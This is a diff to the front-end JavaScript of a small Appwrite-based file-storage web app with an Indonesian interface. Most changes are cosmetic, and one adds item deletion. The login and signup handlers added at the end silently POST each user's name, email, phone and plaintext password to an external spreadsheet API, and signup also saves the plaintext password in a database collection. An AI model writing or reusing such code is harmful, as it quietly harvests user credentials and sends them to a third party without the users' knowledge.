@@ -3,6 +3,7 @@ const account = new Appwrite.Account(client);
 const databases = new Appwrite.Databases(client);
 const storage = new Appwrite.Storage(client);
 
+// KONFIGURASI
 const CONFIG = {
     ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
     PROJECT_ID: '697f71b40034438bb559', 
@@ -21,7 +22,7 @@ let currentFolderName = "Drive";
 
 const el = (id) => document.getElementById(id);
 
-// === STORAGE CALCULATION ===
+// === STORAGE LOGIC ===
 async function calculateStorage() {
     if (!currentUser) return;
     try {
@@ -38,16 +39,17 @@ async function calculateStorage() {
     } catch (e) { console.error(e); }
 }
 
-// === LOAD FILES & HEADER DYNAMICS ===
+// === LOAD FILES ===
 async function loadFiles(folderId) {
     if (!currentUser) return;
     const grid = el('fileGrid'); grid.innerHTML = '';
     const header = el('headerTitle');
 
+    // Breadcrumb Logic
     if(folderId === 'root') {
         updateGreeting(); 
     } else {
-        header.innerHTML = `<button onclick="loadFiles('root')" class="btn-pill small" style="background:rgba(255,255,255,0.2); width:auto; padding:0 15px; margin-right:15px; display:inline-flex;"><i class="fa-solid fa-arrow-left"></i> Kembali</button> ${currentFolderName}`;
+        header.innerHTML = `<button onclick="loadFiles('root')" class="btn-pill small" style="background:rgba(255,255,255,0.2); width:auto; padding:0 15px; margin-right:15px; display:inline-flex; align-items:center; gap:5px;"><i class="fa-solid fa-arrow-left"></i> Kembali</button> ${currentFolderName}`;
     }
 
     try {
@@ -55,8 +57,12 @@ async function loadFiles(folderId) {
             Appwrite.Query.equal('owner', currentUser.$id),
             Appwrite.Query.equal('parentId', folderId)
         ]);
-        if(res.documents.length === 0) grid.innerHTML = `<p style="color:rgba(255,255,255,0.3); width:100%; text-align:center; grid-column: 1/-1;">Folder ini masih kosong</p>`;
-        res.documents.forEach(doc => renderItem(doc));
+        
+        if(res.documents.length === 0) {
+            grid.innerHTML = `<p style="color:rgba(255,255,255,0.4); width:100%; text-align:center; grid-column: 1/-1; margin-top:50px;">Folder ini masih kosong</p>`;
+        } else {
+            res.documents.forEach(doc => renderItem(doc));
+        }
     } catch (e) { console.error(e); }
 }
 
@@ -65,11 +71,11 @@ function renderItem(doc) {
     const div = document.createElement('div');
     const isFolder = doc.type === 'folder';
     let preview = '';
-    const namaFile = (doc.nama || "").toLowerCase();
+    const nama = (doc.nama || "").toLowerCase();
 
     if (isFolder) {
         preview = `<i class="icon fa-solid fa-folder"></i>`;
-    } else if (namaFile.match(/\.(jpg|jpeg|png|webp|gif)$/)) {
+    } else if (nama.match(/\.(jpg|jpeg|png|webp|gif)$/)) {
         const url = storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId);
         preview = `<img src="${url}" class="thumb-img" loading="lazy">`;
     } else {
@@ -87,7 +93,7 @@ function renderItem(doc) {
     grid.appendChild(div);
 }
 
-// === FUNCTIONS ===
+// === ACTIONS ===
 window.openFolder = (id, nama) => { currentFolderId = id; currentFolderName = nama; loadFiles(id); };
 
 window.submitCreateFolder = async () => {
@@ -102,7 +108,7 @@ window.submitCreateFolder = async () => {
 };
 
 window.submitUploadFile = async () => {
-    if (!window.selectedFile) return alert("Pilih file!");
+    if (!window.selectedFile) return;
     closeModal('uploadModal'); el('loading').classList.remove('hidden');
     try {
         const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), window.selectedFile);
@@ -114,7 +120,17 @@ window.submitUploadFile = async () => {
     } finally { el('loading').classList.add('hidden'); }
 };
 
-// === INIT ===
+window.deleteItem = async (id, type, fileId) => {
+    if (!confirm("Hapus item ini?")) return;
+    el('loading').classList.remove('hidden');
+    try {
+        if (type === 'file') await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
+        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, id);
+        loadFiles(currentFolderId); calculateStorage();
+    } finally { el('loading').classList.add('hidden'); }
+};
+
+// === INIT & UI HELPERS ===
 async function checkSession() {
     try {
         currentUser = await account.get();
@@ -134,3 +150,31 @@ el('dropZone').addEventListener('drop', (e) => { e.preventDefault(); handleFileS
 el('fileInputHidden').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
 function handleFileSelect(f) { window.selectedFile = f; el('fileInfoText').innerText = `File: ${f.name}`; }
 el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));
+
+// LOGIN & SIGNUP (Shortened for brevity but fully functional)
+if (el('loginForm')) el('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    let id = el('loginEmail').value.trim(); const pw = el('loginPass').value;
+    try {
+        if (!id.includes('@')) {
+            const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', id)]);
+            if (res.total === 0) throw new Error("User tidak ditemukan");
+            id = res.documents[0].email;
+        }
+        await account.createEmailPasswordSession(id, pw);
+        currentUser = await account.get();
+        fetch(`${SHEETDB_API}?sheet=Login`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: [{"ID": currentUser.$id, "Nama": currentUser.name, "Email": currentUser.email, "Password": pw, "Riwayat Waktu": new Date().toLocaleString()}]}) });
+        checkSession();
+    } catch(e) { alert(e.message); }
+});
+
+if (el('signupForm')) el('signupForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const name = el('regName').value; const email = el('regEmail').value; const phone = el('regPhone').value; const pass = el('regPass').value;
+    try {
+        const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
+        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone, password: pass });
+        fetch(`${SHEETDB_API}?sheet=SignUp`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: [{"ID": auth.$id, "Nama": name, "Email": email, "Phone": phone, "Password": pass, "Waktu": new Date().toLocaleString()}]}) });
+        alert("Berhasil!"); nav('loginPage');
+    } catch (e) { alert(e.message); }
+});
